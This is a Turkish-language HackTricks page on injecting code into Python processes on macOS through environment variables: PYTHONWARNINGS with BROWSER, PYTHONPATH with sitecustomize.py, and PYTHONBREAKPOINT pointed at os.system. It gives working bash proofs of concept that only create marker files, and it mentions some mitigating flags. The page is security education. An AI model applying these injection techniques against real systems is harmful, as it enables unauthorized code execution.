# macOS Python Application Injection

{{#include ../../../banners/hacktricks-training.md}}

## `PYTHONWARNINGS` ve `BROWSER` environment variable'ları aracılığıyla

Bir attacker Python process'inin environment'ını kontrol edebiliyorsa, `PYTHONWARNINGS` ve `BROWSER` kombinasyonu, Python hazırlanmış bir warning seçeneğini işlerken `antigravity` modülünü import ettiğinde command execution tetikleyebilir. Bu teknik, `antigravity`'nin Python'ın `webbrowser` modülüyle bir URL açmasına dayanır; `webbrowser` modülü `BROWSER` environment variable'ını dikkate alır.<sup>[[1]](#references)</sup>
```bash
# Generate an example Python script.
echo "print('hi')" > /tmp/script.py

# Create /tmp/hacktricks through the inherited environment.
PYTHONWARNINGS="all:0:antigravity.x:0:0" BROWSER="/bin/sh -c 'touch /tmp/hacktricks' #%s" python3 /tmp/script.py

# With isolated mode, inject the warning rule using -W instead.
BROWSER="/bin/sh -c 'touch /tmp/hacktricks' #%s" python3 -I -W all:0:antigravity.x:0:0 /tmp/script.py
```
## `PYTHONPATH` ve `sitecustomize.py` aracılığıyla

Normal başlangıç sırasında Python'ın `site` modülü site'a özgü yolları ekler ve ardından `sitecustomize` adlı bir modülü import etmeyi dener. Saldırganın okuyabildiği bir dizini `PYTHONPATH` içinde ilk sıraya yerleştirerek, process environment'ını kontrol eden bir saldırgan Python'ın hedef script'ten önce bir payload import etmesini sağlayabilir. `-S` flag'i otomatik `site` initialization işlemini devre dışı bırakırken isolated mode (`-I`), `PYTHONPATH` değerini yok sayar ve `-s` ile `-E` flag'lerini uygular.<sup>[[2]](#references)[[3]](#references)</sup>
```bash
mkdir -p /tmp/python-startup
cat >/tmp/python-startup/sitecustomize.py <<'EOF'
from pathlib import Path
Path('/tmp/python-sitecustomize-executed').touch()
EOF

PYTHONPATH=/tmp/python-startup python3 /tmp/script.py
```
## `PYTHONBREAKPOINT` Üzerinden

Python 3.7'den beri (PEP 553) yerleşik `breakpoint()` işlevi, `sys.breakpointhook`'un işaret ettiği şeyi import eder ve çağırır; bu hedef, **`PYTHONBREAKPOINT`** environment variable'ından (`package.module.callable`) alınır. Adlandırılan module'ün import edilmesi ve callable'ın çağrılması, debugger normalde görünmeden önce gerçekleşir. Bu nedenle, bir `breakpoint()` çağrısına ulaşan bir process'in environment'ını kontrol eden attacker (maintenance/debug script'lerinde yaygın olarak ve bazen production path'lerinde unutulmuş şekilde bulunur) code execution elde eder.<sup>[[4]](#references)</sup>
```bash
cat >/tmp/bp.py <<'EOF'
import sys
print("before")
breakpoint(*sys.argv[1:])
EOF

# breakpoint() invokes the chosen callable with its arguments
PYTHONBREAKPOINT="os.system" python3 /tmp/bp.py "touch /tmp/py-bp-executed"
ls -la /tmp/py-bp-executed
```
`PYTHONWARNINGS`/`PYTHONPATH`'in aksine, bunun hedefin gerçekten bir `breakpoint()` çağrısına ulaşmasını gerektirdiğini belirtmek gerekir; ancak adlandırılan modülün yalnızca **import yan etkileri** üzerinden de çalışır (herhangi bir import edilebilir modüle yönlendirin — örneğin `PYTHONPATH` içinde ilk sıraya yerleştirilmiş ve üst düzeyinde kod çalıştıran bir modüle). `PYTHONBREAKPOINT=0` ayarı hook'u tamamen devre dışı bırakır.

## References

- [1] [Environment Variables ile Hacking - elttam](https://www.elttam.com/blog/env/)
- [2] [site — Site-özel yapılandırma hook'u](https://docs.python.org/3/library/site.html)
- [3] [Python komut satırı ve ortamı](https://docs.python.org/3/using/cmdline.html)
- [4] [PEP 553 — Yerleşik breakpoint() ve PYTHONBREAKPOINT](https://peps.python.org/pep-0553/)
{{#include ../../../banners/hacktricks-training.md}}
